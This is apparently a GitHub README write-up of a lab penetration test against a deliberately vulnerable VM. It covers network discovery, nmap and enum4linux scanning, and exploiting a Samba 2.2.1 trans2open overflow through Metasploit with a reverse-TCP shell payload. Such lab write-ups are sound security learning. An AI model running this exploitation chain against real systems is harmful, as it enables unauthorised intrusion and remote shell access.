# Metasploitable
 Metasaploitable VM - A detailed penetration testing report covering enumeration, vulnerability analysis, and exploitation.

## 📋 Table of Contents
1. [Enumeration](#1-enumeration)
2. [Vulnerability Analysis](#2-vulnerability-analysis)
3. [Exploitation](#3-exploitation)

---

## 1. Enumeration
In this phase, I identified the target and scanned for open services.

### Network Discovery
I used `ip addr show` to indetify my IP Then `netdiscover` to find the target IP on the local NAT network.
*   **Command:** `ip addr show ` 192.168.2.4
*   **Command:** `sudo netdiscover -r 192.168.2.4/24`
*   **Evidence:** [View Ip address](https://github.com/user-attachments/assets/e20bba01-f631-4805-afeb-fc48ba962b7f)
*   **Evidence:** [View Devices](https://github.com/user-attachments/assets/00b06cd8-8ca2-4877-a327-be89cf6c1d81)

### Port Scanning
An aggressive Nmap scan revealed several interesting ports, including 80 (HTTP) and 139/445 (SMB).
*   **Command:** `enum4linux 192.168.2.14`
*   **Command:** `nmap -A -p- 192.168.2.14`
*   **Evidence:** [View Enumeration](https://github.com/user-attachments/assets/ab4c41b7-ced6-421f-9c57-8837bec22810)
*   **Evidence:** [View Nmap Scan](https://github.com/user-attachments/assets/d1f1def7-1434-4a03-94c7-11bd74902d88)

---

## 2. Vulnerability Analysis
I identified an outdated version of **Samba (2.2.1)** which is vulnerable to a "trans2open" overflow.
*   **Command:** Searchsploit samba 2.2.1
*   **Command:** Load msfconsole > search Samba 2
*   **Evidence:** [View Searchsploit](https://github.com/user-attachments/assets/af581393-6a41-4fc3-818f-c333a42b7a68)
*   **Evidence:** [View msfconsole search](https://github.com/user-attachments/assets/50c87db7-88b2-4837-bed1-b60ec8dbd3b6)


---

## 3. Exploitation
I then set the Responding Host, Listening Host loaded the payload then proceeded to Run(exploit)
*   **Command:** `set RHOSTS 192.168.2.14 `
*   **Command:** `set payload (linux/X86/shell/reverse-tcp)`
*   **Command:** `exploit`
*   **Command:** `/sbin/ifconfig`
*   **Evidence:** [View  RHOSTS](https://github.com/user-attachments/assets/1eb7a80c-1ee2-4f2f-a1e8-d37a7737715b)
*   **Evidence:** [View Payloads](https://github.com/user-attachments/assets/31ca5941-8e8f-4c5d-8dfc-49d011098847)
*   **Evidence:** [View Exploit](https://github.com/user-attachments/assets/27040f8b-fa7e-41f6-8bfb-aa0bc35df3bf)
*   **Evidence:** [View Kioptrix IP](https://github.com/user-attachments/assets/af4ac459-0816-4002-bf67-878698bb17cc)
